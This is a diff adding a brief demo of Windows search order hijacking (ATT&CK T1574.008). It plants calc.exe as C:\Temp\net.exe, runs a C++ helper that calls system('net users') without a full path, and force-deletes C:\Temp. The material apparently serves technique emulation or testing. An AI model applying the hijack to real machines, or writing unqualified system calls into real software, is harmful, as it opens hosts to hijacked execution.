@@ -1,0 +1,25 @@
+
+Hijack Execution Flow: Path Interception by Search Order Hijacking   T1574.008
+
+
+
+copy C:\Windows\System32\calc.exe C:\Temp\net.exe
+C:\Temp\HijackExecFlowEx.exe
+rmdir /s /q C:\Temp
+----------------------------
+
+
+HijackExecFlowEx.cpp 
+--------------------------
+#include <cstdlib>
+
+int main() {
+    // Use el comando "whoami" sin mostrar la salida
+    std::system("net users");
+
+    return 0;
+}
+--------------------------
+
+
+
